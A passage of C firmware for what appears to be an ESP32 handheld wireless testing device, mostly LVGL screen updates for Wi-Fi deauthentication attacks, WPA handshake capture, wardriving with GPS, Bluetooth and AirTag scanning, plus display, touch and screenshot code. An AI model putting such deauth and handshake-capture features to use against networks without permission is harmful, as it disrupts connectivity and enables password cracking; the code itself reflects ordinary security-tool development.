                                        channels_updated = true;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
                
                // Only update UI if it's still valid
                if (ui_valid) {
                    // Rebuild the deauth list UI with updated channel info
                    lv_obj_clean(deauth_list);
                    
                    if (new_records && new_count > 0) {
                        for (int t = 0; t < deauth_target_count; t++) {
                            // Find matching record for SSID display
                            char ssid_str[33] = "";
                            for (int n = 0; n < (int)new_count; n++) {
                                if (memcmp(deauth_target_bssids[t], new_records[n].bssid, 6) == 0) {
                                    if (new_records[n].ssid[0] != 0) {
                                        strncpy(ssid_str, (const char *)new_records[n].ssid, sizeof(ssid_str) - 1);
                                    }
                                    break;
                                }
                            }
                            
                            char line[128];
                            const char *band = (deauth_target_channels[t] <= 14) ? "2.4" : "5";
                            
                            if (ssid_str[0] != 0) {
                                snprintf(line, sizeof(line), "%s (Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                         ssid_str, deauth_target_channels[t], band,
                                         deauth_target_bssids[t][0], deauth_target_bssids[t][1],
                                         deauth_target_bssids[t][2], deauth_target_bssids[t][3],
                                         deauth_target_bssids[t][4], deauth_target_bssids[t][5]);
                            } else {
                                snprintf(line, sizeof(line), "(Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                         deauth_target_channels[t], band,
                                         deauth_target_bssids[t][0], deauth_target_bssids[t][1],
                                         deauth_target_bssids[t][2], deauth_target_bssids[t][3],
                                         deauth_target_bssids[t][4], deauth_target_bssids[t][5]);
                            }
                            
                            lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
                            lv_obj_set_width(row, lv_pct(100));
                            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
                            lv_obj_set_style_pad_all(row, 6, 0);
                            lv_obj_set_style_pad_gap(row, 8, 0);
                            lv_obj_set_height(row, LV_SIZE_CONTENT);
                            lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
                            lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
                            lv_obj_set_style_radius(row, 8, 0);
                            
                            lv_obj_t *lbl = lv_label_create(row);
                            lv_label_set_text(lbl, line);
                            lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
                            lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
                            lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
                            lv_obj_set_width(lbl, lv_pct(95));
                        }
                    }
                    
                    // Update title
                    if (deauth_prompt_label && lv_obj_is_valid(deauth_prompt_label)) {
                        lv_label_set_text(deauth_prompt_label, channels_updated ? 
                                          "Deauth attack in progress (channels updated)" : 
                                          "Deauth attack in progress");
                    }
                }
                
                // Free records if allocated
                if (new_records) {
                    lv_mem_free(new_records);
                }
                
                // Re-save targets with updated channels and resume attack
                wifi_scanner_save_target_bssids();
                wifi_attacks_start_deauth();
                
                deauth_rescan_active = false;
                ESP_LOGI(TAG, "Deauth rescan complete, attack resumed");
            }

            // BLE Scan UI update (thread-safe - only update from LVGL task)
            if (ble_scan_needs_ui_update && ble_scan_ui_active) {
                ble_scan_needs_ui_update = false;
                
                // Update status label
                if (ble_scan_status_label) {
                    lv_label_set_text(ble_scan_status_label, ble_scan_status_text);
                }
                
                // Update device list
                ble_scan_update_list();
            }

            // BT Locator UI update (thread-safe - only update from LVGL task)
            if (bt_locator_needs_ui_update && bt_locator_ui_active) {
                bt_locator_needs_ui_update = false;
                
                if (bt_locator_tracking_active) {
                    // Tracking mode - update RSSI display
                    if (bt_locator_rssi_label) {
                        if (bt_tracking_found) {
                            char rssi_text[32];
                            snprintf(rssi_text, sizeof(rssi_text), "RSSI: %d", bt_tracking_rssi);
                            lv_label_set_text(bt_locator_rssi_label, rssi_text);
                        }
                    }
                } else {
                    // Scanning mode - update status and show list when done
                    if (bt_locator_status_label) {
                        snprintf(bt_locator_status_text, sizeof(bt_locator_status_text),
                                 "BT scanning... %d devices", bt_device_count);
                        lv_label_set_text(bt_locator_status_label, bt_locator_status_text);
                    }
                    
                    // If scan finished, show the list and hide status
                    if (ble_scan_finished && bt_locator_list) {
                        if (bt_locator_status_label) {
                            lv_obj_add_flag(bt_locator_status_label, LV_OBJ_FLAG_HIDDEN);
                        }
                        // Show header label (stored in content user_data)
                        if (bt_locator_content) {
                            lv_obj_t *header = (lv_obj_t *)lv_obj_get_user_data(bt_locator_content);
                            if (header) {
                                lv_obj_clear_flag(header, LV_OBJ_FLAG_HIDDEN);
                            }
                        }
                        lv_obj_clear_flag(bt_locator_list, LV_OBJ_FLAG_HIDDEN);
                        bt_locator_update_list();
                    }
                }
            }

            // BT Scan & Select UI update
            if (bt_sas_needs_update && bt_sas_ui_active) {
                bt_sas_needs_update = false;
                if (bt_sas_status_label && lv_obj_is_valid(bt_sas_status_label)) {
                    lv_label_set_text(bt_sas_status_label, ble_scan_status_text);
                }
                bt_sas_refresh_list();
                // If scan finished show Next prompt if device selected
                if (ble_scan_finished && bt_sas_selected_idx < 0 &&
                    bt_sas_status_label && lv_obj_is_valid(bt_sas_status_label)) {
                    lv_label_set_text(bt_sas_status_label,
                        bt_device_count > 0 ? "Tap a device to select" : "No devices found");
                }
            }

            // Disco mode screen update (driven by disco_task flag)
            if (disco_needs_update && disco_mode_active && disco_screen_obj) {
                disco_needs_update = false;
                uint8_t c = disco_color_idx;
                lv_obj_set_style_bg_color(disco_screen_obj,
                    lv_color_make(DISCO_PALETTE[c].r, DISCO_PALETTE[c].g, DISCO_PALETTE[c].b), 0);
                for (int i = 0; i < 4; i++) {
                    if (disco_layers[i]) {
                        uint8_t lc = (c + i * 2 + 1) % DISCO_NC;
                        lv_obj_set_style_bg_color(disco_layers[i],
                            lv_color_make(DISCO_PALETTE[lc].r, DISCO_PALETTE[lc].g, DISCO_PALETTE[lc].b), 0);
                    }
                }
            }

            // BT Lookout — poll for new detection, wake from blackout and show popup
            {
                bt_lookout_detection_t det;
                if (bt_lookout_poll_detection(&det)) {
                    go_dark_disable();
                    char mac_str[18];
                    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                             det.mac[0], det.mac[1], det.mac[2],
                             det.mac[3], det.mac[4], det.mac[5]);
                    show_lookout_alert_popup(det.name, mac_str, det.rssi);
                    if (bt_lookout_last_lbl && lv_obj_is_valid(bt_lookout_last_lbl)) {
                        char last_buf[64];
                        snprintf(last_buf, sizeof(last_buf), "%s  %s", det.name, mac_str);
                        lv_label_set_text(bt_lookout_last_lbl, last_buf);
                    }
                    bt_lookout_update_ui();
                }
            }

            // GATT Walker UI update
            if (gw_ui_needs_update && gw_screen_active) {
                gw_ui_needs_update = false;
                gw_update_screen_ui();
            }

            // Deauth Monitor UI update
            if (deauth_monitor_update_flag && deauth_monitor_ui_active) {
                deauth_monitor_update_flag = false;
                
                // Check if we have attacks to display
                portENTER_CRITICAL(&deauth_monitor_spin);
                int attack_count = deauth_monitor_attack_count;
                portEXIT_CRITICAL(&deauth_monitor_spin);
                
                if (attack_count > 0 && deauth_monitor_list && deauth_monitor_status_label) {
                    // Hide status labels, show list
                    lv_obj_add_flag(deauth_monitor_status_label, LV_OBJ_FLAG_HIDDEN);
                    if (deauth_monitor_known_label && lv_obj_is_valid(deauth_monitor_known_label))
                        lv_obj_add_flag(deauth_monitor_known_label, LV_OBJ_FLAG_HIDDEN);
                    lv_obj_clear_flag(deauth_monitor_list, LV_OBJ_FLAG_HIDDEN);
                    
                    // Rebuild attack list (keep title, clear rest)
                    uint32_t child_count = lv_obj_get_child_cnt(deauth_monitor_list);
                    while (child_count > 1) {
                        lv_obj_t *last_child = lv_obj_get_child(deauth_monitor_list, child_count - 1);
                        lv_obj_del(last_child);
                        child_count--;
                    }
                    
                    // Add attacks (most recent first)
                    portENTER_CRITICAL(&deauth_monitor_spin);
                    int display_count = (attack_count > DEAUTH_MONITOR_MAX_ATTACKS) ? DEAUTH_MONITOR_MAX_ATTACKS : attack_count;
                    for (int i = display_count - 1; i >= 0; i--) {
                        int idx = (attack_count > DEAUTH_MONITOR_MAX_ATTACKS) 
                                  ? (attack_count + i) % DEAUTH_MONITOR_MAX_ATTACKS 
                                  : i;
                        
                        char line[80];
                        snprintf(line, sizeof(line), "%s | CH: %d | RSSI: %d",
                                 deauth_monitor_attacks[idx].ssid,
                                 deauth_monitor_attacks[idx].channel,
                                 deauth_monitor_attacks[idx].rssi);
                        
                        lv_obj_t *row = lv_list_add_btn(deauth_monitor_list, NULL, "");
                        lv_obj_set_width(row, lv_pct(100));
                        lv_obj_set_style_pad_all(row, 6, 0);
                        lv_obj_set_height(row, LV_SIZE_CONTENT);
                        lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
                        lv_obj_set_style_radius(row, 8, 0);
                        
                        lv_obj_t *lbl = lv_label_create(row);
                        lv_label_set_text(lbl, line);
                        lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
                        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
                        lv_obj_set_style_text_color(lbl, COLOR_MATERIAL_RED, 0);
                        lv_obj_set_width(lbl, lv_pct(95));
                    }
                    portEXIT_CRITICAL(&deauth_monitor_spin);
                }
            }

            // AirTag Scanner UI update
            if (airtag_scan_update_flag && airtag_scan_ui_active) {
                airtag_scan_update_flag = false;
                
                // Read snapshot values (thread-safe copy)
                int snap_airtag = airtag_scan_snapshot_airtag;
                int snap_smarttag = airtag_scan_snapshot_smarttag;
                int snap_total = airtag_scan_snapshot_total;
                
                // Hide "Scan in progress", show stats
                if (airtag_scan_status_label && lv_obj_is_valid(airtag_scan_status_label)) {
                    lv_obj_add_flag(airtag_scan_status_label, LV_OBJ_FLAG_HIDDEN);
                }
                
                // Update and show stats labels
                if (airtag_scan_stats_label1 && lv_obj_is_valid(airtag_scan_stats_label1)) {
                    char stats1[64];
                    snprintf(stats1, sizeof(stats1), "Air Tags: %d\nSmart Tags: %d",
                             snap_airtag, snap_smarttag);
                    lv_label_set_text(airtag_scan_stats_label1, stats1);
                    lv_obj_clear_flag(airtag_scan_stats_label1, LV_OBJ_FLAG_HIDDEN);
                }

                // Show "View Found Tags" button when at least one tag is detected
                if (airtag_view_tags_btn && lv_obj_is_valid(airtag_view_tags_btn)) {
                    if (snap_airtag + snap_smarttag > 0) {
                        lv_obj_clear_flag(airtag_view_tags_btn, LV_OBJ_FLAG_HIDDEN);
                    } else {
                        lv_obj_add_flag(airtag_view_tags_btn, LV_OBJ_FLAG_HIDDEN);
                    }
                }
                
                if (airtag_scan_stats_label2 && lv_obj_is_valid(airtag_scan_stats_label2)) {
                    int other_devices = snap_total - snap_airtag - snap_smarttag;
                    if (other_devices < 0) other_devices = 0;
                    char stats2[48];
                    snprintf(stats2, sizeof(stats2), "Other BT Devices: %d", other_devices);
                    lv_label_set_text(airtag_scan_stats_label2, stats2);
                    lv_obj_clear_flag(airtag_scan_stats_label2, LV_OBJ_FLAG_HIDDEN);
                }
                
                if (airtag_scan_stats_label3 && lv_obj_is_valid(airtag_scan_stats_label3)) {
                    char stats3[48];
                    snprintf(stats3, sizeof(stats3), "Total BT devices: %d", snap_total);
                    lv_label_set_text(airtag_scan_stats_label3, stats3);
                    lv_obj_clear_flag(airtag_scan_stats_label3, LV_OBJ_FLAG_HIDDEN);
                }
            }

            // Handshake dashboard UI update (flag-based, like deauth monitor)
            if (hs_ui_update_flag && handshake_ui_active) {
                hs_ui_update_flag = false;

                if (hs_ui_channel_label && lv_obj_is_valid(hs_ui_channel_label)) {
                    char ch_buf[32];
                    snprintf(ch_buf, sizeof(ch_buf), "CH %d", hs_current_channel);
                    lv_label_set_text(hs_ui_channel_label, ch_buf);
                }

                if (hs_ui_target_label && lv_obj_is_valid(hs_ui_target_label)) {
                    if (hs_current_target_ssid[0]) {
                        lv_label_set_text(hs_ui_target_label, hs_current_target_ssid);
                    } else {
                        lv_label_set_text(hs_ui_target_label, "Scanning...");
                    }
                }

                if (hs_ui_status_label && lv_obj_is_valid(hs_ui_status_label)) {
                    if (hs_listening_after_deauth) {
                        char st_buf[48];
                        snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_REFRESH " Listening... %s", hs_current_client_mac);
                        lv_label_set_text(hs_ui_status_label, st_buf);
                        lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_GREEN, 0);
                    } else if (hs_current_client_mac[0]) {
                        char st_buf[48];
                        snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_CLOSE " Deauth -> %s", hs_current_client_mac);
                        lv_label_set_text(hs_ui_status_label, st_buf);
                        lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_ORANGE, 0);
                    } else {
                        lv_label_set_text(hs_ui_status_label, "");
                    }
                }

                int best_ap = -1;
                if (hs_ap_count > 0) {
                    for (int i = 0; i < hs_ap_count; i++) {
                        if (hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
                    }
                    if (best_ap < 0) {
                        for (int i = 0; i < hs_ap_count; i++) {
                            if (hs_ap_targets[i].complete || hs_ap_targets[i].has_existing_file) continue;
                            if (hs_ap_targets[i].channel == hs_current_channel) { best_ap = i; break; }
                        }
                    }
                    if (best_ap < 0) {
                        for (int i = 0; i < hs_ap_count; i++) {
                            if (!hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
                        }
                    }
                }

                bool has_beacon = false, m1 = false, m2 = false, m3 = false, m4 = false;
                if (best_ap >= 0) {
                    has_beacon = hs_ap_targets[best_ap].beacon_captured;
                    m1 = hs_ap_targets[best_ap].captured_m1;
                    m2 = hs_ap_targets[best_ap].captured_m2;
                    m3 = hs_ap_targets[best_ap].captured_m3;
                    m4 = hs_ap_targets[best_ap].captured_m4;
                }

                if (hs_ui_beacon_label && lv_obj_is_valid(hs_ui_beacon_label))  {
                    lv_label_set_text(hs_ui_beacon_label, has_beacon ? LV_SYMBOL_WIFI : LV_SYMBOL_WARNING);
                    lv_obj_set_style_text_color(hs_ui_beacon_label, has_beacon ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
                }
                if (hs_ui_m1_label && lv_obj_is_valid(hs_ui_m1_label)) {
                    lv_obj_set_style_text_color(hs_ui_m1_label, m1 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
                }
                if (hs_ui_m2_label && lv_obj_is_valid(hs_ui_m2_label)) {
                    lv_obj_set_style_text_color(hs_ui_m2_label, m2 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
                }
                if (hs_ui_m3_label && lv_obj_is_valid(hs_ui_m3_label)) {
                    lv_obj_set_style_text_color(hs_ui_m3_label, m3 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
                }
                if (hs_ui_m4_label && lv_obj_is_valid(hs_ui_m4_label)) {
                    lv_obj_set_style_text_color(hs_ui_m4_label, m4 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
                }

                if (hs_ui_stats_label && lv_obj_is_valid(hs_ui_stats_label)) {
                    char stats_buf[128];
                    snprintf(stats_buf, sizeof(stats_buf), "APs: %d  Cli: %d  Cap: %d",
                             hs_ap_count, hs_client_count, hs_total_handshakes_captured);
                    lv_label_set_text(hs_ui_stats_label, stats_buf);
                }
            }

            // Wardrive dashboard UI update (flag-based)
            if (wd_ui_update_flag && wardrive_ui_active) {
                wd_ui_update_flag = false;

                if (wd_ui_channel_label && lv_obj_is_valid(wd_ui_channel_label)) {
                    char wd_ch_buf[16];
                    snprintf(wd_ch_buf, sizeof(wd_ch_buf), "CH %d", wdp_current_channel);
                    lv_label_set_text(wd_ui_channel_label, wd_ch_buf);
                }

                if (wd_ui_gps_label && lv_obj_is_valid(wd_ui_gps_label)) {
                    char gps_buf[80];
                    if (current_gps.valid) {
                        snprintf(gps_buf, sizeof(gps_buf), LV_SYMBOL_GPS " %.5f, %.5f  Sats: %d",
                                 current_gps.latitude, current_gps.longitude, current_gps.satellites);
                        lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_GREEN, 0);
                    } else {
                        snprintf(gps_buf, sizeof(gps_buf), "Waiting for GPS fix...  Sats: %d", current_gps.satellites);
                        lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_ORANGE, 0);
                    }
                    lv_label_set_text(wd_ui_gps_label, gps_buf);
                }

                if (wd_ui_counter_label && lv_obj_is_valid(wd_ui_counter_label)) {
                    char cnt_buf[32];
                    snprintf(cnt_buf, sizeof(cnt_buf), "%d", wdp_seen_count);
                    lv_label_set_text(wd_ui_counter_label, cnt_buf);
                }

                if (wd_ui_table && lv_obj_is_valid(wd_ui_table)) {
                    int total = wdp_seen_count;
                    int show = (total > 50) ? 50 : total;
                    int start = total - show;
                    lv_table_set_row_cnt(wd_ui_table, show > 0 ? show : 1);
                    lv_table_set_col_cnt(wd_ui_table, 5);
                    for (int i = 0; i < show; i++) {
                        wdp_network_t *net = &wdp_seen_networks[start + show - 1 - i];
                        char ssid_trunc[20];
                        strncpy(ssid_trunc, net->ssid[0] ? net->ssid : "[hidden]", 19);
                        ssid_trunc[19] = '\0';
                        lv_table_set_cell_value(wd_ui_table, i, 0, ssid_trunc);
                        char ch_str[4]; snprintf(ch_str, sizeof(ch_str), "%d", net->channel);
                        lv_table_set_cell_value(wd_ui_table, i, 1, ch_str);
                        char rssi_str[8]; snprintf(rssi_str, sizeof(rssi_str), "%d", net->rssi);
                        lv_table_set_cell_value(wd_ui_table, i, 2, rssi_str);
                        const char *auth = get_auth_mode_wiggle(net->authmode);
                        char auth_short[8]; strncpy(auth_short, auth, 7); auth_short[7] = '\0';
                        lv_table_set_cell_value(wd_ui_table, i, 3, auth_short);
                        char coord_str[24];
                        if (net->latitude != 0.0f || net->longitude != 0.0f) {
                            snprintf(coord_str, sizeof(coord_str), "%.2f", (double)net->latitude);
                        } else {
                            snprintf(coord_str, sizeof(coord_str), "--");
                        }
                        lv_table_set_cell_value(wd_ui_table, i, 4, coord_str);
                    }
                }
            }

            sleep_ms = lv_timer_handler();
            
            // Reset watchdog INSIDE mutex to catch long rendering operations
            esp_task_wdt_reset();
            
            xSemaphoreGive(lvgl_mutex);
        }

        // Reset watchdog again after releasing mutex
        esp_task_wdt_reset();
        
        // Process pending karma saves (with SPI mutex to avoid display conflicts)
        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(10)) == pdTRUE) {
            wifi_attacks_process_pending_saves();
            xSemaphoreGive(sd_spi_mutex);
        }
        
        vTaskDelay(pdMS_TO_TICKS(sleep_ms > 10 ? 10 : sleep_ms));
    }
}

static uint32_t flush_call_count = 0;
static uint32_t flush_mutex_wait_count = 0;

static bool IRAM_ATTR on_color_trans_done(esp_lcd_panel_io_handle_t io,
                                          esp_lcd_panel_io_event_data_t *edata,
                                          void *user_ctx)
{
    // Signal the flush task — lv_disp_flush_ready() must be called from task context,
    // NOT from this ISR. Calling it here invokes _lv_disp_refr_timer() from ISR which
    // corrupts LVGL's already_running guard and silently kills all timer processing.
    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
    xSemaphoreGiveFromISR(flush_done_sem, &xHigherPriorityTaskWoken);
    portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
    return false;
}

void lvgl_flush_cb(lv_disp_drv_t *drv, const lv_area_t *area, lv_color_t *color_p)
{
    lvgl_flush_counter++;
    flush_call_count++;
    
    // Log co 100 flushów aby nie zaśmiecić logu
    /*if (flush_call_count % 100 == 0) {
        ESP_LOGI(TAG, "[FLUSH] Call #%u, area: (%d,%d)-(%d,%d)", 
                 flush_call_count, area->x1, area->y1, area->x2, area->y2);
    }*/
    
    esp_lcd_panel_handle_t panel = (esp_lcd_panel_handle_t)drv->user_data;
    int32_t width = area->x2 - area->x1 + 1;
    int32_t height = area->y2 - area->y1 + 1;
    
    if (color_p == NULL || width <= 0 || height <= 0) {
        ESP_LOGE(TAG, "[FLUSH] ERROR: Invalid parameters! color_p=%p, w=%d, h=%d",
                 color_p, width, height);
        lv_disp_flush_ready(drv);
        return;
    }
    
    // CRITICAL: Take SD/SPI mutex before drawing to display
    // Display and SD card share the same SPI bus (SPI2_HOST)
    if (sd_spi_mutex) {
        TickType_t start = xTaskGetTickCount();
        int wait_attempt = 0;

        while (true) {
            if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(50)) == pdTRUE) {
                esp_lcd_panel_draw_bitmap(panel, area->x1, area->y1, area->x2 + 1, area->y2 + 1, color_p);
                xSemaphoreGive(sd_spi_mutex);
                // Wait for DMA completion ISR, then signal LVGL from task context
                xSemaphoreTake(flush_done_sem, pdMS_TO_TICKS(1000));
                lv_disp_flush_ready(drv);
                return;
            }

            wait_attempt++;
            TickType_t elapsed = xTaskGetTickCount() - start;
            if (elapsed > pdMS_TO_TICKS(5000)) {
                ESP_LOGW(TAG, "[FLUSH] SPI mutex stuck >5s (attempt %d), skipping flush",
                         wait_attempt);
                lv_disp_flush_ready(drv);
                return;
            }

            esp_task_wdt_reset();
            flush_mutex_wait_count++;
        }
    } else {
        esp_lcd_panel_draw_bitmap(panel, area->x1, area->y1, area->x2 + 1, area->y2 + 1, color_p);
        xSemaphoreTake(flush_done_sem, pdMS_TO_TICKS(1000));
        lv_disp_flush_ready(drv);
    }
}

void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data)
{
    if (go_dark_active) {
        data->state = LV_INDEV_STATE_RELEASED;
        return;
    }
    static int call_count = 0;
    xpt2046_handle_t *touch = (xpt2046_handle_t *)indev_drv->user_data;
    xpt2046_touch_point_t point;
    const int64_t now_ms = esp_timer_get_time() / 1000;
    bool touched = false;
    
    // Debug counter kept but no console prints (avoid VFS write during draw)
    call_count++;
    if (xpt2046_read_touch(touch, &point) && point.touched) {
        touched = true;
        last_input_ms = now_ms;
    }

    if (screen_dimmed) {
        if (touched) {
            screen_set_dimmed(false);
        }
        data->state = LV_INDEV_STATE_RELEASED;
        touch_pressed_flag = false;
        return;
    }

    if (ignore_touch_until_release) {
        if (!touched) {
            ignore_touch_until_release = false;
        }
        data->state = LV_INDEV_STATE_RELEASED;
        touch_pressed_flag = false;
        return;
    }

    if (ui_locked) {
        data->state = LV_INDEV_STATE_RELEASED;
        touch_pressed_flag = false;
        return;
    }

    if (touched) {
        data->point.x = point.x;
        data->point.y = point.y;
        data->state = LV_INDEV_STATE_PRESSED;
        touch_pressed_flag = true;
        touch_x_flag = point.x;
        touch_y_flag = point.y;
    } else {
        data->state = LV_INDEV_STATE_RELEASED;
        touch_pressed_flag = false;
    }
}

// ============================================================================
// Screenshot utilities (BMP, uncompressed 24-bit)
// ============================================================================

static esp_err_t ensure_screenshot_dir(void)
{
    struct stat st;
    if (stat(SCREENSHOT_DIR, &st) == 0 && S_ISDIR(st.st_mode)) {
        return ESP_OK;
    }
    if (mkdir(SCREENSHOT_DIR, 0775) == 0) {
        return ESP_OK;
    }
    return (errno == EEXIST) ? ESP_OK : ESP_FAIL;
}

static int find_next_screenshot_index(void)
{
    DIR *dir = opendir(SCREENSHOT_DIR);
    if (!dir) {
        return 1;
    }
    int max_idx = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        int idx = 0;
        if (sscanf(entry->d_name, "screen_%d.bmp", &idx) == 1) {
            if (idx > max_idx) max_idx = idx;
        }
    }
    closedir(dir);
    return max_idx + 1;
}

static esp_err_t save_snapshot_bmp(lv_img_dsc_t *shot, const char *filepath)
{
    if (!shot || !filepath) return ESP_ERR_INVALID_ARG;

    const uint32_t w = shot->header.w;
    const uint32_t h = shot->header.h;
    if (w == 0 || h == 0) return ESP_ERR_INVALID_SIZE;

    const uint32_t row_stride = ((w * 3 + 3) / 4) * 4; // padded to 4 bytes
    const uint32_t pixel_data_size = row_stride * h;
    const uint32_t file_size = 14 + 40 + pixel_data_size;

    uint8_t *row_buf = heap_caps_malloc(row_stride, MALLOC_CAP_SPIRAM);
    if (!row_buf) return ESP_ERR_NO_MEM;

    FILE *f = fopen(filepath, "wb");
    if (!f) {
        heap_caps_free(row_buf);
        return ESP_FAIL;
    }

    // BITMAPFILEHEADER
    uint8_t bf[14] = {0};
    bf[0] = 'B'; bf[1] = 'M';
    bf[2] = (uint8_t)(file_size);
    bf[3] = (uint8_t)(file_size >> 8);
    bf[4] = (uint8_t)(file_size >> 16);
    bf[5] = (uint8_t)(file_size >> 24);
    bf[10] = 14 + 40; // pixel data offset
    fwrite(bf, 1, sizeof(bf), f);

    // BITMAPINFOHEADER
    uint8_t bi[40] = {0};
    bi[0] = 40; // header size
    bi[4] = (uint8_t)(w);
    bi[5] = (uint8_t)(w >> 8);
    bi[6] = (uint8_t)(w >> 16);
    bi[7] = (uint8_t)(w >> 24);
    bi[8] = (uint8_t)(h);
    bi[9] = (uint8_t)(h >> 8);
    bi[10] = (uint8_t)(h >> 16);
    bi[11] = (uint8_t)(h >> 24);
    bi[12] = 1; bi[13] = 0;      // planes
    bi[14] = 24; bi[15] = 0;     // bpp
    fwrite(bi, 1, sizeof(bi), f);

    const lv_color_t *src = (const lv_color_t *)shot->data;
    for (int y = (int)h - 1; y >= 0; y--) { // BMP bottom-up
        uint8_t *row = row_buf;
        for (uint32_t x = 0; x < w; x++) {
            lv_color_t c = src[(uint32_t)y * w + x];
#if LV_COLOR_DEPTH == 16
            uint8_t r = (c.ch.red << 3) | (c.ch.red >> 2);
            uint8_t g6 = LV_COLOR_GET_G16(c);   // 6-bit green (swap-safe macro)
            uint8_t g = (g6 << 2) | (g6 >> 4);  // expand to 8-bit
            uint8_t b = (c.ch.blue << 3) | (c.ch.blue >> 2);
#else
            uint8_t r = LV_COLOR_GET_R(c);
            uint8_t g = LV_COLOR_GET_G(c);
            uint8_t b = LV_COLOR_GET_B(c);
#endif
            *row++ = b;
            *row++ = g;
            *row++ = r;
        }
        while ((row - row_buf) < (int)row_stride) {
            *row++ = 0;
        }
        fwrite(row_buf, 1, row_stride, f);
    }

    fclose(f);
    heap_caps_free(row_buf);
    return ESP_OK;
}

static void set_screenshot_buttons_disabled(bool disabled)
{
    lv_obj_t *buttons[] = { main_screenshot_btn, screenshot_btn };
    for (size_t i = 0; i < sizeof(buttons) / sizeof(buttons[0]); i++) {
        lv_obj_t *btn = buttons[i];
        if (btn && lv_obj_is_valid(btn)) {
            if (disabled) {
                lv_obj_add_state(btn, LV_STATE_DISABLED);
                lv_obj_add_flag(btn, LV_OBJ_FLAG_HIDDEN);
            } else {
                lv_obj_clear_state(btn, LV_STATE_DISABLED);
                lv_obj_clear_flag(btn, LV_OBJ_FLAG_HIDDEN);
            }
            lv_obj_invalidate(btn);
        }
    }
    lv_obj_invalidate(lv_scr_act());
}

static void screenshot_finish_ui_cb(void *user_data)
{
    bool ok = ((uintptr_t)user_data) != 0;
    screenshot_in_progress = false;
    set_screenshot_buttons_disabled(false);
    if (ok) {
        ESP_LOGI(TAG, "Screenshot: saved successfully");
    } else {
        ESP_LOGW(TAG, "Screenshot: save failed");
    }
    lv_refr_now(NULL);
}

static void screenshot_save_task(void *arg)
{
    (void)arg;
    screenshot_msg_t msg;
    for (;;) {
        if (xQueueReceive(screenshot_queue, &msg, portMAX_DELAY) == pdTRUE) {
            esp_err_t res = ESP_FAIL;
            char path[128] = {0};

            if (msg.shot) {
                if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, portMAX_DELAY) == pdTRUE) {
                    esp_err_t dir_res = ensure_screenshot_dir();
                    if (dir_res == ESP_OK) {
                        int next_idx = find_next_screenshot_index();
                        snprintf(path, sizeof(path), SCREENSHOT_DIR "/screen_%d.bmp", next_idx);
                        res = save_snapshot_bmp(msg.shot, path);
                        if (res == ESP_OK) {
                            ESP_LOGI(TAG, "Screenshot saved: %s", path);
                        } else {
                            ESP_LOGW(TAG, "Screenshot failed to save (path: %s)", path);
                        }
                    } else {
                        ESP_LOGW(TAG, "Screenshot: cannot ensure directory");
                        res = dir_res;
                    }
                    xSemaphoreGive(sd_spi_mutex);
                } else {
                    ESP_LOGW(TAG, "Screenshot: SD mutex unavailable");
                }
                lv_snapshot_free(msg.shot);
            }

            lv_async_call(screenshot_finish_ui_cb, (void *)(uintptr_t)(res == ESP_OK));
        }
    }
}

static void screenshot_btn_event_cb(lv_event_t *e)
{
    (void)e;

    if (!wifi_wardrive_is_sd_mounted()) {
        ESP_LOGW(TAG, "Screenshot: SD card not mounted");
        return;
    }

    if (screenshot_in_progress) {
        ESP_LOGW(TAG, "Screenshot already in progress");
        return;
    }

    if (!screenshot_queue || !screenshot_task_handle) {
        ESP_LOGE(TAG, "Screenshot: worker not initialized");
        return;
    }

    set_screenshot_buttons_disabled(true);
    lv_refr_now(NULL);

    // Run inside LVGL context (button callback), safe to snapshot without mutex
    lv_img_dsc_t *shot = lv_snapshot_take(lv_scr_act(), LV_IMG_CF_TRUE_COLOR);  // RGB565
    if (!shot) {
        ESP_LOGW(TAG, "Screenshot: lv_snapshot_take returned NULL");
        set_screenshot_buttons_disabled(false);
        lv_refr_now(NULL);
        return;
    }

    screenshot_msg_t msg = {
        .shot = shot,
    };

    if (xQueueSend(screenshot_queue, &msg, 0) != pdTRUE) {
        ESP_LOGW(TAG, "Screenshot: queue busy");
        lv_snapshot_free(shot);
        set_screenshot_buttons_disabled(false);
        lv_refr_now(NULL);
        return;
    }

    screenshot_in_progress = true;
}
lv_obj_t *create_menu_item(lv_obj_t *parent, const char *icon, const char *text)
{
    lv_obj_t *cont = lv_menu_cont_create(parent);
    lv_obj_set_style_pad_all(cont, 6, 0);  // 1.5x bigger (was 3, now 6)
    lv_obj_set_style_pad_gap(cont, 8, 0);  // 1.5x bigger (was 5, now 8)
